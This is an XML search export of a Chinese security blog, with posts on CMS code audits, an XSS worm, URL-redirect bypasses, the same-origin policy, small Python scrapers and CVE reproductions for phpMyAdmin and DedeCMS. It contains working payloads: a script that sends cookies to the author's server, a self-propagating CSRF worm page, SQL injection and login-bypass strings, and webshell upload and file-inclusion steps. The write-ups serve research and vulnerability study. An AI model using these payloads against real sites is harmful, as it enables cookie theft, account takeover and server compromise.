<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[UsualToolCMS]]></title>
    <url>%2F2019%2F04%2F03%2FUsualToolCMS%2F</url>
    <content type="text"><![CDATA[挺简单一款CMS 前台SQL注入search.php 直接看代码 1234567891011$key=UsualToolCMS::sqlcheck($_GET["key"]);$navname="search";require_once(dirname(__FILE__).'/'.'mytop.php');//搜索记录if(!empty($key)):$asql="SELECT * FROM `cms_search` WHERE keyword ='$key'";$adata=mysqli_query($mysqli,$asql);if(mysqli_num_rows($adata)&gt;0):$mysqli-&gt;query("UPDATE `cms_search` SET `hit`=hit+1 WHERE keyword ='$key' and lang='$language'");else:$mysqli-&gt;query("INSERT INTO `cms_search` (`lang`,`keyword`) VALUES ('$language','$key')"); $key被sqlcheck函数过滤了，让我们看下这个函数 12345678910function sqlchecks($StrPost)&#123;$StrPost=str_replace("'","’",$StrPost);$StrPost=str_replace('"','“',$StrPost);$StrPost=str_replace("(","（",$StrPost);$StrPost=str_replace(")","）",$StrPost);$StrPost=str_replace("@","#",$StrPost);$StrPost=str_replace("/*","",$StrPost);$StrPost=str_replace("*/","",$StrPost);return $StrPost;&#125; 如果没有Url编码的话这里应该是不存在漏洞的了，仔细看上面的代码，数据库操作中还有一个$language,我们追踪下$language吧 全局查找，直接找到其定义的地方 conn.php 1if(!empty($_COOKIE['UTCMSLanguage'])):$language=$_COOKIE['UTCMSLanguage'];else:$language=$indexlanguage;endif; $language没有经过任何过滤就从Cookie传了进来 这就简单咯]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CNVD漏洞检测]]></title>
    <url>%2F2019%2F04%2F01%2FCNVD%2F</url>
    <content type="text"><![CDATA[使用Python获取CNVD漏洞信息，与Redis相结合，用于储存信息，每次运行检测是否有新的漏洞产生，有的话进行提醒 4/1简单的将Python与Redis进行结合做出来的第一个版本12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-#!/usr/bin/env python3import requestsimport redisimport re#constantHOST = 'localhost'PORT = 6379PWD = ''URL = "http://www.cnvd.org.cn/flaw/list.htm?flag=true"headers = &#123; 'User-Agent':' Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'&#125;Data = &#123;'max':20,'offset':0&#125;R = redis.Redis(host=HOST,port=PORT,password=PWD)res = requests.post(URL,data=Data,headers=headers)text = bytes.decode(res.content)infos = re.findall('&lt;/img&gt; &lt;a\s.+href="/flaw/show/(.*?)"?\s+title="(.*?)"&gt;',text)for i in infos: info = i[0]+','+i[1] if R.sadd('CNVD',info): print('[*]New Info:',info) PS:使用集合可能不是那么明智的选择 4/1更新代码，采用json保存用户信息，同时增加保存成文件的功能12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# -*- coding: utf-8 -*-#!/usr/bin/env python3import argparseimport requestsimport redisimport jsonimport sysimport reimport os#import user infotry: UserInfo = json.load(open('userinfo.json'))except: print('[-]Load Json File Error!') exit()#use redisr = redis.Redis(host=UserInfo['Host'],port=UserInfo['Port'],password=UserInfo['Pwd'])try: acount = r.scard('CNVD') print('[+]目前漏洞数为:',acount)except Exception as e: print('[-]Redis',e) exit()def scanCNVD(): res = requests.post(UserInfo['Url'],data=UserInfo['Data'],headers=UserInfo['Headers']) text = bytes.decode(res.content) infos = re.findall('&lt;/img&gt; &lt;a\s.+href="/flaw/show/(.*?)"?\s+title="(.*?)"&gt;',text) for i in infos: info = i[0]+','+i[1] if r.sadd('CNVD',info): print('[*]New Info:',info) print('[*]Scan Finish.') r.save()def writeFile(): cont = [bytes.decode(i) for i in r.smembers('CNVD')] if os.path.isfile('CNVD.csv'): with open('CNVD.csv','a') as af: af.write('\n'.join(cont)) else: with open('CNVD.csv','w') as wf: wf.write('编号,内容\n'+'\n'.join(cont)) print('[+]Save In CNVD.csv.')if __name__ == '__main__': parse = argparse.ArgumentParser(description="CNVD INFO.") parse.add_argument('--update','-u',action='store_true',help='Update CNVD INFO') parse.add_argument('--file','-f',action='store_true',help='Save CNVD INFO') args = parse.parse_args() try: sys.argv[1] except: parse.print_help() exit() if args.file: writeFile() if args.update: scanCNVD() json12345678&#123; "Host":"localhost", "Port": 6379, "Pwd" :"", "Url" :"http://www.cnvd.org.cn/flaw/list.htm?flag=true", "Data":&#123;"max":20,"offset":0&#125;, "Headers":&#123;"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"&#125;&#125; Git已上传至Githubhttps://github.com/No4l/MyTools/tree/master/CNVD 海底月是天上月，眼前人是心上人。向来心是看客心，奈何人是剧中人。]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSWORM]]></title>
    <url>%2F2019%2F03%2F31%2Fxssworm%2F</url>
    <content type="text"><![CDATA[一个不错的XSSWORM需要许多知识，总的来说还是很有趣的 利用条件 可以利用的XSS 例如个人档案，留言处，发表的文章，发表的动态之类的 可控点 XSS存在处的CSRF 所需知识 XSS Ajax 隐蔽的发送请求 同源策略 http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more 实现步骤 发现可利用的XSS，以留言处为例 发表留言处存在CSRF 发表带有XSS的留言，XSS的作用是发布留言同时可以做一些其他事，例如获取Cookie 用户被感染，留言传播 实例分析以某游记系统为例具体分析一下 发表游记的参数中有一个直接输出，得到一枚储存型XSS 想要构成worm,我们需要让其他看了这篇游记的人也发表一篇带有恶意代码的游记 回到发表游记处，这里存在一个CSRF 123&#123;"id":"******","userId":"*****","userName":"******","AssociateEntityList":[&#123;"brandId":134,"brandName":"ABT","seriesId":2366,"seriesName":"ABT A3"&#125;] ............ 不过这里有一点儿问题 这里有id,userID,以及userName 后面经过测试发现发表游记的时候id和userName都可以为空，那么问题来了，userId怎么获得呢？ 别忘了我们已经有一个储存型XSS了 发现Cookie里有一个 1userid=97***548 通过XSS将Cookie发送到自己的服务器上，同时对Cookie进行处理，得到userId,并进行CSRF操作 可能有些同学这时候就有疑问了，为什么不直接用JavaScript处理呢？ 原因是发表游记时值是Json的形式，使用JS很容易出错，如果使用转义符的话最后输出的时候转义符也会在，最后迫不得已选择了上述操作 我们可以构造储存型XSS啦！ 123456&lt;script&gt; var o=document.body; var a=document.createElement("iframe");a.src="http://noel.xin/cookie.php?Cookie="+document.cookie; a.style.opacity=0; o.appendChild(a);&lt;/script&gt; 利用得到的userID发表游记 index.php 12345678910111213&lt;?php$Cookie = @$_GET[&apos;Cookie&apos;]?$_GET[&apos;Cookie&apos;]:&apos;&apos;;$start = strpos($Cookie,&quot;userid&quot;)+10;$id = substr($Cookie,$start,8);?&gt;&lt;script&gt; var req = new XMLHttpRequest(); var data = &quot;jsonData=&#123;&apos;id&apos;:0,&apos;userId&apos;:&lt;?=$id?&gt;,&apos;userName&apos;:&apos;&apos;,&apos;XSS&apos;:&apos;上述代码&apos;&#125;&quot;; req.open(&apos;post&apos;,&apos;https://target.com&apos;,true); req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;); req.withCredentials = true; req.send(data);&lt;/script&gt; 完成！ 之后只要别人看了我发的游记后都会发一篇带有恶意代码的XSS，当然，为了爱和正义，文章立刻给删了。 也许不能喜欢你到天边的花火都枯萎，但真的梦想过与你，并肩去看一场烟火]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Url Redirect]]></title>
    <url>%2F2019%2F03%2F31%2FURLRedirect%2F</url>
    <content type="text"><![CDATA[URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式### 成因 常见方式 META标签的refresh Javascript header meta 1&lt;meta http-equiv="refresh" content="0; url=url"&gt; Javascript 1location.href="url"; header 123&lt;?php header("Location:url");?&gt; 当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞 发现 在退出处常见URL跳转 利用burp的search，搜索=http 同时返回包为302的内容 发包到repeater,略作修改 绕过一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护 1.xip.io绕过 这里只要不是www就会强制返回到https://xue.xx.com/login 但是利用https://xue.xx.com.*.xip.io 2.使用@绕过 这里并不能采用xip.io的方式绕过 可以使用@但是如果@后的域名不在规定范围内同样不可跳转 这个时候可以在@前加上/，\或者?尝试下 3.http://后加反斜杠绕过 有些时候@和.xip.io都不能使 这个时候可以采用http://\的样式尝试绕过 4.某些加密 http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT 这个链接会跳转到http://www.xilu.com/zhuanti_176871.html 将 l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT base64解密 1\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93 推测与跳转的链接一一对应，推测出对应关系表 123&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;, &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, &apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;, &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125; 我寻了半生的春天，你一笑便是了。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BeesCMS 代码审计]]></title>
    <url>%2F2019%2F03%2F30%2Fbees%2F</url>
    <content type="text"><![CDATA[挺简单一套CMS，找SQL注入的时候脑残了 后台直接上传WebShell漏洞位于/admin/admin_pic_upload.php 直接看上传相关的代码 123456789101112131415161718192021if(is_uploaded_file($v))&#123; $pic_info['tmp_name']=$v; $pic_info['size']=$_FILES['up']['size'][$k]; $pic_info['type']=$_FILES['up']['type'][$k]; $pic_info['name']=$_FILES['up']['name'][$k]; $pic_name_alt=empty($is_alt)?'':$pic_alt[$k]; $is_up_size = $_sys['upload_size']*1000*1000; $value_arr=up_img($pic_info,$is_up_size,array('image/gif','image/jpeg','image/png','image/jpg','image/bmp','image/pjpeg','image/x-png'),$up_is_thumb,$up_thumb_width,$up_thumb_height,$logo=1,$pic_name_alt); //处理上传后的图片信息 $pic_name=$value_arr['up_pic_name'];//图片名称空 $pic_ext=$value_arr['up_pic_ext'];//图片扩展名 $pic_title = $pic_alt[$k];//图片描述 $pic_size = $value_arr['up_pic_size'];//图片大小 $pic_path = $value_arr['up_pic_path'];//上传路径 $pic_time = $value_arr['up_pic_time'];//上传时间 $pic_thumb = iconv('GBK','UTF-8',$value_arr['thumb']);//缩略图 $cate = empty($pic_cate)?1:$pic_cate;//图片栏目 //入库$sql="insert into ".DB_PRE."uppics (pic_name,pic_ext,pic_alt,pic_size,pic_path,pic_time,pic_thumb,pic_cate) values ('".$pic_name."','".$pic_ext."','".$pic_title."','".$pic_size."','".$pic_path."','".$pic_time."','".$pic_thumb."',".$cate.")";$mysql-&gt;query($sql);&#125; up_img函数用来判断文件类型，原函数为 1up_img($file,$size,$type,$thumb=0,$thumb_width='',$thumb_height='',$logo=1,$pic_alt='') 这里的type很明显是 1array('image/gif','image/jpeg','image/png','image/jpg','image/bmp','image/pjpeg','image/x-png') 这一串，也就是说这是一个只检测Content-Type的函数 轻松搞定 用户咨询鸡肋越权/member/member.php 看修改咨询处代码 123456...... $id=intval(fl_value($_GET['id'])); $member_id=intval(fl_value($_GET['member_id'])); if(empty($id))&#123;die("&lt;script type=\"text/javascript\"&gt;alert('&#123;$language['msg_info10']&#125;');history.go(-1);&lt;/script&gt;");&#125; $sql="select*from ".DB_PRE."ask where id=&#123;$id&#125; and member=&#123;$member_id&#125;";...... 只要知道id以及咨询的id即可得知别人的咨询，当然也可以通过遍历，并没什么卵用 产品购买处存在SQL注入/mx_form/order_save.php 1234567$addtime=time();$ip=fl_value(get_ip());$ip=fl_html($ip);$member_id=empty($_SESSION['id'])?0:$_SESSION['id'];$arc_id=empty($f_id)?0:intval($_POST['f_id']);$sql="insert into ".DB_PRE."formlist (form_id,form_time,form_ip,member_id,arc_id) values (&#123;$form_id&#125;,&#123;$addtime&#125;,'&#123;$ip&#125;','&#123;$member_id&#125;','&#123;$arc_id&#125;')";$mysql-&gt;query($sql); IP经过fl_value以及fl_html处理 先来看下fl_value 12345function fl_value($str)&#123; if(empty($str))&#123;return;&#125; return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file|outfile/i','',$str);&#125; 可以看出有许多问题，首先是将一些敏感字符替换为空，替换为空，替换为空！！！ 问题似乎很简单了 再来看下fl_html 123function fl_html($str)&#123; return htmlspecialchars($str);&#125; 这里使用了htmlspecialchars进行转义，那么这又是何方神圣呢 看下官方解释 字符 替换后 &amp; (&amp; 符号) &amp; “ (双引号) &quot;，除非设置了 ENT_NOQUOTES ‘ (单引号) 设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。 &lt; (小于) &lt; &gt; (大于) &gt; 其作用是将一些敏感字符替换掉，那么注意了，这里之说当指定了ENT_QUOTES后单引号才会被替换！！！ 看来这两个函数对我们并没有什么影响了呢 在购买处填写好消息，然后提交 增加X-Forwarded-For X-Forwarded-For: lalala&#39;,&#39;0&#39;,&#39;&#39; or updatexml(1,concat(0x7e,user(),0x7e),1))# 该CMS基本上都是采用这两个函数进行过滤，也就是说，这个CMS到处是注入！！ 后台处： 账号:’ unselection selselectect 1,2,md5(3),4,0# 密码:3 可以直接登陆后台 进入后台利用上传处漏洞可GETSHELL 我愿千金散尽只为赠你火树银花；我愿点亮夜空只为你灿烂一笑。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Subdomain Collect Plan]]></title>
    <url>%2F2019%2F03%2F21%2Fsubdomin%2F</url>
    <content type="text"><![CDATA[咕咕咕 3/21基础版本,利用百度API收集子域名12345678910111213141516171819202122232425262728293031323334353637# -*- coding: utf-8 -*-#!/usr/bin/env python3#Author: Noelimport jsonimport requestsimport argparse#API URLBDURL = "http://ce.baidu.com/index/getRelatedSites?site_address="URLS = set(&#123;&#125;)def baidu(url): res = requests.get(BDURL+url) a = json.loads(res.text) for i in a['data']: URLS.add(i['domain'])if __name__ == '__main__': #Parameter Processing parser = argparse.ArgumentParser(description='Collect Subdomain.') parser.add_argument('--domain','-d',required=True,help='target domain') parser.add_argument('--file','-f',help='save file name.default is domain.txt') args = parser.parse_args() #GET Subdomain baidu(args.domain) #Subdomain Processing print('[+]Collect Complete.') if args.file: with open(args.file,'w') as wf: wf.write('\n'.join(URLS)) print('[+]File Saved in',args.file) else: with open('domain.txt','w') as wf: wf.write('\n'.join(URLS)) print('[+]File Saved in domain.txt') 持续更新咕咕咕]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于同源策略]]></title>
    <url>%2F2019%2F02%2F15%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[最近挖洞总是遇到CORS之类的，索性就再次了解下同源策略 介绍说到同源策略，经常会有这么一张图那我们从头分析这是个什么意思 第一个是http协议，而第三个是https协议，协议不同 第一个是80端口，第四个是81端口，端口不同 第一个的主机名是store.company.com,第五个的是news.company.com,不同主机名也就是说只有协议，端口，主机名，都相同的情况下才满足同源策略那么这有什么用呢？当然是在某种程度上减轻了恶意脚本执行造成的危害，举个栗子A登陆了a.com,并且在新的标签页打开了有恶意读取Cookie的b.com,这个时候由于同源策略，a.com的CooKie就不会被读取到a网站123&lt;?phpsetcookie("Cookie","admin");echo "&lt;script&gt;alert(document.cookie);&lt;/script&gt;"; b网站1&lt;script&gt;alert(document.cookie);&lt;/script&gt; 当a.com想要调用b.com的API的时候同源策略也会进行阻止12345678910&lt;script type="text/javascript"&gt; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() &#123; if(xhr.readyState === 4) &#123; console.log(xhr.responseText); &#125; &#125; xhr.open("GET", "http://b.com/get?id=1"); xhr.send();&lt;/script&gt; 跨域请求刚刚还在说禁止跨域，怎么现在就出现了跨域请求呢？一般而言，网络请求可以大体分为三类 跨域写，通常被允许，像重定向，提交表单之类的都属于这个了 跨域嵌入，通常被允许，像&lt;script&gt;,&lt;link&gt;,&lt;img&gt; 之类的都是允许的 跨域读，通常被禁止，但是脚本还是执行了，只不过禁止读取回复同源策略影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。 CORSCORS又是什么东西呢？上面已经提到，在嵌入外域数据时，同源策略并不会起到作用，但是，XMLHttpRequest就有些难受啦，只能发送数据，但是不能查看返回信息,当然，CSRF的话只要发送数据成功就已经OK啦，而CORS 策略，则是允许 Web 应用程序进行跨域访问CORS通过一些特殊的 HTTP 头来确保哪些源站可以请求哪些资源通常而言，在跨域前会发送一个OPTIONS头的请求包，如果请求包内容检查通过，才会发送真正的请求123456789101112131415161718192021OPTIONS /c HTTP/1.1Host: b.a.comConnection: closeOrigin: http://b.a.comAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: Content-TypeHTTP/1.1 200 OKDate: Fri, 15 Feb 2019 14:50:45 GMTServer: TengineAccess-Control-Allow-Origin: http://*.a.comAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: Content-TypeAccess-Control-Max-Age: 86400Vary: Accept-Encoding, OriginContent-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 先来看请求头，其中的Origin表示发起请求的主机名，而返回头中有一个Access-Control-Allow-Origin，如果请求的Origin不在这个范围内，检查不通过。Access-Control-Request-Method是请求的方法，Access-Control-Allow-Methods是允许的方法Access-Control-Request-Headers同 JSONPJSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。随便找了个有callback的网站123456&lt;script&gt;function book(data) &#123; alert(data.result.bookName);&#125;;&lt;/script&gt;&lt;script type="text/javascript" src='https://m.zongheng.com/h5/ajax/chapter?bookId=195804&amp;chapterId=4210194_2&amp;callback=book'&gt;&lt;/script&gt;]]></content>
      <categories>
        <category>策略</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpMyAdmin 4.8.0~4.8.3 任意文件包含/远程代码执行漏洞 (CVE-2018-19968)]]></title>
    <url>%2F2019%2F02%2F11%2FCVE-2018-19968%2F</url>
    <content type="text"><![CDATA[不知不觉就咸鱼了一周(发出了断九幺的声音)，复现了下CVE-2018-19968，顺便分析下源码 介绍 影响4.8.0~4.8.3版本 读取本地文件 需要登陆适用于可以登陆PHPMyAdmin,但是无法限制了写入文件的情况 详情漏洞产生于tbl_replace.php中12345678910111213141516171819202122232425262728293031323334353637383940414243//if some posted fields need to be transformed.$mime_map = Transformations::getMIME($GLOBALS['db'], $GLOBALS['table']);if ($mime_map === false) &#123; $mime_map = array();&#125;$query_fields = array();$insert_errors = array();$row_skipped = false;$unsaved_values = array();[...] // Apply Input Transformation if defined if (!empty($mime_map[$column_name]) &amp;&amp; !empty($mime_map[$column_name]['input_transformation']) ) &#123; $filename = 'libraries/classes/Plugins/Transformations/' . $mime_map[$column_name]['input_transformation']; if (is_file($filename)) &#123; include_once $filename; $classname = Transformations::getClassName($filename); /** @var IOTransformationsPlugin $transformation_plugin */ $transformation_plugin = new $classname(); $transformation_options = Transformations::getOptions( $mime_map[$column_name]['input_transformation_options'] ); $current_value = $transformation_plugin-&gt;applyTransformation( $current_value, $transformation_options ); // check if transformation was successful or not // and accordingly set error messages &amp; insert_fail if (method_exists($transformation_plugin, 'isSuccess') &amp;&amp; !$transformation_plugin-&gt;isSuccess() ) &#123; $insert_fail = true; $row_skipped = true; $insert_errors[] = sprintf( __('Row: %1$s, Column: %2$s, Error: %3$s'), $rownumber, $column_name, $transformation_plugin-&gt;getError() ); &#125; &#125; &#125; 注意其中的include_once $filename;而$filename = &#39;libraries/classes/Plugins/Transformations/&#39;. $mime_map[$column_name][&#39;input_transformation&#39;];mime_map[$column_name][‘input_transformation’];又来自于$mime_map = Transformations::getMIME($GLOBALS[&#39;db&#39;], $GLOBALS[&#39;table&#39;]); getMIME则是libraries/classes/Transformations.php的一个方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public static function getMIME($db, $table, $strict = false, $fullName = false)&#123; $relation = new Relation(); $cfgRelation = $relation-&gt;getRelationsParam(); if (! $cfgRelation['mimework']) &#123; return false; &#125; $com_qry = ''; if ($fullName) &#123; $com_qry .= "SELECT CONCAT(" . "`db_name`, '.', `table_name`, '.', `column_name`" . ") AS column_name, "; &#125; else &#123; $com_qry = "SELECT `column_name`, "; &#125; $com_qry .= '`mimetype`, `transformation`, `transformation_options`, `input_transformation`, `input_transformation_options` FROM ' . Util::backquote($cfgRelation['db']) . '.' . Util::backquote($cfgRelation['column_info']) . ' WHERE `db_name` = \'' . $GLOBALS['dbi']-&gt;escapeString($db) . '\' AND `table_name` = \'' . $GLOBALS['dbi']-&gt;escapeString($table) . '\' AND ( `mimetype` != \'\'' . (!$strict ? ' OR `transformation` != \'\' OR `transformation_options` != \'\' OR `input_transformation` != \'\' OR `input_transformation_options` != \'\'' : '') . ')'; $result = $GLOBALS['dbi']-&gt;fetchResult( $com_qry, 'column_name', null, DatabaseInterface::CONNECT_CONTROL ); foreach ($result as $column =&gt; $values) &#123; // convert mimetype to new format (f.e. Text_Plain, etc) $delimiter_space = '- '; $delimiter = "_"; $values['mimetype'] = self::fixupMIME($values['mimetype']); // For transformation of form // output/image_jpeg__inline.inc.php // extract dir part. $dir = explode('/', $values['transformation']); $subdir = ''; if (count($dir) === 2) &#123; $subdir = ucfirst($dir[0]) . '/'; $values['transformation'] = $dir[1]; &#125; $values['transformation'] = self::fixupMIME($values['transformation']); $values['transformation'] = $subdir . $values['transformation']; $result[$column] = $values; &#125; return $result;&#125; 从$values[&#39;transformation&#39;] = $subdir . $values[&#39;transformation&#39;];知道mime_map[$column_name][&#39;input_transformation&#39;]= $subdir . $values[&#39;transformation&#39;]而$value则是来自于$result$result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($com_qry, &#39;column_name&#39;, null, DatabaseInterface::CONNECT_CONTROL);执行的sql语句是1SELECT `column_name`, `mimetype`, `transformation`, `transformation_options`, `input_transformation`, `input_transformation_options` FROM `db_name`.`pma__column_info` WHERE `db_name` = 'db_name' AND `table_name` = 'table_name' AND ( `mimetype` != '' OR `transformation` != '' OR `transformation_options` != '' OR `input_transformation` != '' OR `input_transformation_options` != '') 创建一个表123CREATE DATABASE foo;CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '&lt;?php phpinfo(); ?&gt;'; 向pma__column_info中插入数据12INSERT INTO pma__column_info SELECT '1', 'foo', 'bar', 'baz', 'plop','plop', 'plop', 'plop','../../../../../../../../test','plop'; 查询结果1234567mysql&gt; SELECT `column_name`, `mimetype`, `transformation`, `transformation_options`, `input_transformation`, `input_transformation_options` FROM `foo`.`pma__column_info` WHERE `db_name` = 'foo' AND `table_name` = 'bar' AND ( `mimetype` != '' OR `transformation` != '' OR `transformation_options` != '' OR `input_transformation` != '' OR `input_transformation_options` != '');+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+| column_name | mimetype | transformation | transformation_options | input_transformation | input_transformation_options |+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+| baz | plop | plop | plop | ../../../../../../../../test | plop |+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+1 row in set (0.00 sec) 这样filename就是libraries/classes/Plugins/Transformations/../../../../../../../../test如果test文件存在就会被包含 复现创建一个表123CREATE DATABASE foo;CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '&lt;?php phpinfo(); ?&gt;'; 指定文件为session文件12INSERT INTO pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', 'plop', 'plop','../../../../../../../../tmp/sess_***','plop'; 其中***为Cookie中PhPmyadmin的值之后访问http://localhost/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1即可看到phpinfo 修复 更新为最新版本]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-20129 织梦V5.7 SP2前台鸡肋文件上传getshell]]></title>
    <url>%2F2019%2F02%2F03%2FCVE-2018-20129%20DedeCMS%20V5.7%20SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%2F</url>
    <content type="text"><![CDATA[抱大佬大腿的第一天，今日要做的事情是复现下CVE-2018-20129，也就是DedeCMS V5.7SP2 的一处通过文件上传get shell 介绍此漏洞限制很大。 需要管理员权限 需要开启会员功能也就是说虽然是前台getshell但是需要有后台权限 详情漏洞产生于/include/dialog/select_images_post.php12require_once(dirname(__FILE__)."/config.php");require_once(dirname(__FILE__)."/../image.func.php"); 看下config.php 123456789101112131415//检验用户登录状态$cuserLogin = new userLogin();if($cuserLogin-&gt;getUserID() &lt;=0 )&#123; if(empty($adminDirHand)) &#123; ShowMsg("&lt;b&gt;提示：需输入后台管理目录才能登录&lt;/b&gt;&lt;br /&gt;&lt;form&gt;请输入后台管理目录名：&lt;input type='hidden' name='gotopage' value='".urlencode($dedeNowurl)."' /&gt;&lt;input type='text' name='adminDirHand' value='dede' style='width:120px;' /&gt;&lt;input style='width:80px;' type='submit' name='sbt' value='转入登录' /&gt;&lt;/form&gt;", "javascript:;"); exit(); &#125; $adminDirHand = HtmlReplace($adminDirHand, 1); $gurl = "../../&#123;$adminDirHand&#125;/login.php?gotopage=".urlencode($dedeNowurl); echo "&lt;script language='javascript'&gt;location='$gurl';&lt;/script&gt;"; exit();&#125; 会先检验用户登录状态，必须要是后台管理员 同时config.php1require_once(dirname(__FILE__)."/../common.inc.php"); 而common.inc.php12345//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数if($_FILES)&#123; require_once(DEDEINC.'/uploadsafe.inc.php');&#125; uploadsafe.inc.php中含有用来处理文件相关的函数12345678910$cfg_not_allowall = "php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml";............if(!empty($&#123;$_key.'_name'&#125;) &amp;&amp; (preg_match("#\.(".$cfg_not_allowall.")$#i",$&#123;$_key.'_name'&#125;) || !preg_match("#\.#", $&#123;$_key.'_name'&#125;)) )&#123; if(!defined('DEDEADMIN')) &#123; exit('Not Admin Upload filetype not allow !'); &#125;&#125; 上传的文件的后缀名不能是$cfg_not_allowall中的这些 123456$imgfile_name = trim(preg_replace("#[ \r\n\t\*\%\\\/\?&gt;&lt;\|\":]&#123;1,&#125;#", '', $imgfile_name));if(!preg_match("#\.(".$cfg_imgtype.")#i", $imgfile_name))&#123; ShowMsg("你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！", "-1"); exit();&#125; 这段代码表示$imgfile_name的一些特殊符号会先被去掉,在限制了php的情况下可以使用p?hp之类的后缀进行绕过，并且$imgfile_name中必须有.jpg,.png之类的 1234567$sparr = Array("image/pjpeg", "image/jpeg", "image/gif", "image/png", "image/xpng", "image/wbmp");$imgfile_type = strtolower(trim($imgfile_type));if(!in_array($imgfile_type, $sparr))&#123; ShowMsg("上传的图片格式错误，请使用JPEG、GIF、PNG、WBMP格式的其中一种！","-1"); exit();&#125; 这段代码表示Content-Type必须是$sparr中的类型 如果网站配置AddType application/x-httpd-php .phtml之类的可以采用.phtml绕过后缀名限制 因为? &lt; &gt; 等字符会被过滤，所以也可以以使用.p?hp的形式绕过 复现首先在后台打开会员功能，同时把注册审核给关了，方便注册然后注册一个新账号，进入发表文章界面点击下方的按钮后选择上传修改后缀名为a.gif.p?hp,同时讲图片内容中加上&lt;?php phpinfo();?&gt;进行访问 修复 关闭会员功能 采用白名单 改进扩展名判断]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
